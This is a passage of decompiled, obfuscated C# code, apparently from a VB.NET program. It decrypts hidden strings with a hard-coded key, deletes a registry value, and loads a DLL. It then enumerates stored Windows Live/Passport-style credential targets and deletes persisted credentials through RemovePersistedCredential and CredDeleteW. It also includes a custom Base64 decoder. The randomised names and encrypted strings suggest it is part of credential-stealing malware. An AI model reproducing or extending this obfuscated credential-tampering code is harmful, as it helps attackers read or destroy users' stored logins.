				num2 = RegQueryValueExA_1(hKey3, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
				if (lpcbData > 0)
				{
					int hKey4 = phkResult;
					lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
					num2 = RegDeleteValueA(hKey4, ref lpSubKey);
					return;
				}
			}
			RegCloseKey(phkResult);
			string lpLibFileName = method_0() + kAXCziSTjI87q6l7zi2zF77("EA4JV0Ui8748ZZ/DXx57K0cxtw3bP5LctlmBtdcr0ig=", "12345#$%");
			if (Operators.CompareString(FileSystem.Dir(lpLibFileName, (FileAttribute)0), (string)null, false) != 0)
			{
				int hLibModule = LoadLibraryA(ref lpLibFileName);
				F1JwaO3a42 guid = default(F1JwaO3a42);
				guid.Data4 = new byte[8];
				guid.Data1 = 1896408858;
				guid.Data2 = -26330;
				guid.Data3 = 20427;
				guid.Data4[0] = 188;
				guid.Data4[1] = 201;
				guid.Data4[2] = 154;
				guid.Data4[3] = 157;
				guid.Data4[4] = 63;
				guid.Data4[5] = 50;
				guid.Data4[6] = 228;
				guid.Data4[7] = 35;
				Initialize(ref guid, 1, 15);
				int lphExternalIdentity = default(int);
				if (Strings.Len(szTargetName) == 0)
				{
					int num3 = Information.UBound((Array)ovPHD8Ts8, 1);
					for (num = 0; num <= num3; num++)
					{
						int num4 = num;
						if (Strings.InStr(ovPHD8Ts8[num4].strTargetName, "ps:", (CompareMethod)0) == 1)
						{
							szTargetName = Strings.Mid(ovPHD8Ts8[num4].strTargetName, 4);
							if (CreateIdentityHandle(szTargetName, 255, ref lphExternalIdentity) == 0)
							{
								num2 = RemovePersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"));
								num2 = RemovePersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"));
								num2 = CloseIdentityHandle(lphExternalIdentity);
							}
						}
					}
				}
				else
				{
					szTargetName = Strings.Mid(szTargetName, 4);
					if (CreateIdentityHandle(szTargetName, 255, ref lphExternalIdentity) == 0)
					{
						num2 = RemovePersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"));
						num2 = RemovePersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"));
						num2 = CloseIdentityHandle(lphExternalIdentity);
					}
				}
				Uninitialize();
				FreeLibrary(hLibModule);
			}
			if (Strings.Len(szTargetName) == 0)
			{
				szTargetName = kAXCziSTjI87q6l7zi2zF77("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
				E7ycFliY80(szTargetName);
				ewoYub4782(intPtr);
			}
			else
			{
				num2 = CredDeleteW(szTargetName, 1, 0);
			}
			if (Strings.Len(szTargetName) == 0)
			{
				szTargetName = kAXCziSTjI87q6l7zi2zF77("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
				E7ycFliY80(szTargetName);
				ewoYub4782(intPtr);
			}
			else
			{
				num2 = CredDeleteW(szTargetName, 4, 0);
			}
			Marshal.FreeHGlobal(intPtr);
		}
	}

	private string LucKIpbk84(ref string Base64String)
	{
		byte[] array = new byte[256];
		if (_0024STATIC_0024Base64Dec_0024201E10E_0024Enc.Length == 0)
		{
			_0024STATIC_0024Base64Dec_0024201E10E_0024Enc = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
		}
		int num = 0;
		checked
		{
			do
			{
				array[num] = 64;
				num++;
			}
			while (num <= 255);
			num = 0;
			do
			{
				array[_0024STATIC_0024Base64Dec_0024201E10E_0024Enc[num]] = (byte)num;
				num++;
			}
			while (num <= 63);
			int num2 = Strings.Len(Base64String);
			byte[] bytes = Encoding.ASCII.GetBytes(Base64String);
			byte[] array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[unchecked(num2 / 4) * 3 - 1 + 1]);
			int num3 = Information.UBound((Array)bytes, 1);
			int num4 = default(int);
			for (num = 0; num <= num3; num += 4)
			{
				array2[num4] = (byte)((unchecked((int)array[bytes[num]]) * 4) | unchecked((int)array[bytes[checked(num + 1)]] / 16));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 1]] & 0xF) * 16) | unchecked((int)array[bytes[checked(num + 2)]] / 4));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 2]] & 3) * 64) | array[bytes[num + 3]]);
				num4++;
			}
			num4 = ((bytes[num2 - 2] == 61) ? 2 : ((bytes[num2 - 1] == 61) ? 1 : 0));
			array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[Information.UBound((Array)array2, 1) - num4 + 1]);
			return Encoding.ASCII.GetString(array2);
		}
	}

	public IEnumerator GetEnumerator()
	{
		Reset();
		return this;
	}

	public void Reset()
	{
		RRhBQFHttxrK9YvOMcecV79();
		hWyFPdqt9 = 0;
	}

	public bool MoveNext()
	{
		if (ovPHD8Ts8 == null)
		{
			return false;
		}
		return hWyFPdqt9 < ovPHD8Ts8.Length;
	}
}
